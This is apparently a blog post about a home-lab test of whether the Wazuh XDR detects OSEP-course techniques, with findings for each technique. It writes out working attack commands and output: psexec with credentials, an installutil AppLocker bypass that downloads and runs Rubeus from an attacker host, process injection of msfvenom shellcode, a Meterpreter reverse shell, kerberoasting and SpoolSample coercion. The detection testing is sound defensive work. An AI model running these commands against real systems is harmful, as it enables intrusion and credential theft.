---
layout: post
title:  "Looking at Wazuh"
date:   2024-01-04 12:04:00 +1100
categories: Investigation
---

There's an open source XDR called Wazuh. [Wazuh - Open Source XDR. Open Source SIEM.](https://wazuh.com/). I wanted to see how some of the techniques taught in the OSEP course show up in an XDR and Wazuh is accessible so I put it in a lab.

### impacket-psexec

The first thing I ran was impacket-psexec.
```
┌──(kali㉿kali)-[~]
└─$ impacket-psexec domain/administrator:Password01@192.168.239.130
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.239.130.....
[*] Found writable share ADMIN$
[*] Uploading file nvvENxrv.exe
[*] Opening SVCManager on 192.168.239.130.....
[*] Creating service XvHs on 192.168.239.130.....
[*] Starting service XvHs.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.914]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> hostname
DC01
```

This was detected, and this is what it looked like.
![image of detection of psexec](/images/psexecdetection.png)

### UninstallForExe

There's an applocker bypass where the Microsoft signed executable installutil can be used to execute arbitrary code against default applocker rules. The UninstallForExe exploit I used can load and run any .net executable in memory, I ran rubeus, running a kerberoast with it. For the applocker configuration, I had all categories enforced, each with the default rules active.

```
C:\Users\mpeanutbutter\Desktop>powershell -c iwr http://192.168.239.128/misc/uninstallforexe.exe -o C:\users\public\uninstallforexe.exe
C:\Users\mpeanutbutter\Desktop>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\public\uninstallforexe.exe
Microsoft (R) .NET Framework Installation utility Version 4.7.3190.0
Copyright (C) Microsoft Corporation.  All rights reserved.

Pulling executable from http://192.168.239.128/tools/rubeus.exe
Calling exe with the following arguments
 kerberoast /nowrap
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0


[*] Action: Kerberoasting
...
...
```

Wazuh didn't detect this, though all I had done with Wazuh was to install the server and agents.

### Process Injection

I ran a process injection that basically comes down to the following two lines of C# where the buf variable was msfvenom shell code.
```
WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero); 
```

Downloaded and executed the process injection shell. It was injecting into explorer.exe.
```
C:\Users\mpeanutbutter\Desktop>powershell -c iwr http://192.168.239.128/misc/shell.exe -o shell.exe
C:\Users\mpeanutbutter\Desktop>shell.exe
```

```
msf6 exploit(multi/handler) > run
[*] Started HTTPS reverse handler on https://192.168.239.128:443
[*] Meterpreter session 1 opened (192.168.239.128:443 -> 192.168.239.133:49870) at 2024-01-03 19:35:18 -0500
meterpreter >
```

Wazuh also did not detect this. I haven't looked into Wazuh much, there might be some further configuration and rule/alert implementation that can make it better.


### Kerberoasting

I wanted to check if there was any detection of kerberoasting.
```
──(kali㉿kali)-[~]
└─$ impacket-GetUserSPNs domain.local/mpeanutbutter:Password01 -dc-ip 192.168.239.130
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName  Name       MemberOf  PasswordLastSet             LastLogon                   Delegation    
--------------------  ---------  --------  --------------------------  --------------------------  -------------
http/fake             bhorseman            2023-11-29 03:57:56.368346  2023-12-19 13:24:10.306345  unconstrained 

```

GetUserSPNs found an SPN that I'd messed around with in the lab.

For this one there was a partial detection. It noticed the auth that GetUserSPNs did but didn't notice anything about the kerberoasting.

![image of detection of kerberoast](/images/kerberoastdetection.png)

### Unconstrained Delegation

Next I tried an unconstrained delegation attack. I set the unconstrained delegation on the client02 machine.

```
PS C:\Users\administrator> iwr http://192.168.239.128/tools/spoolsample64.exe -o spoolsample.exe
PS C:\Users\administrator> .\spoolsample dc01 client02
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\dc01, CaptureServer: \\client02
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
```
Seems the lab is patched for the spoolsample authentication coercion so I didn't collect the tickets from the DC.

Wazuh didn't detect the attempt.

So out of the box, Wazuh doesn't seem fantastic. The rabit hole probably goes deep on configuring and tuning it to be an effective XDR. 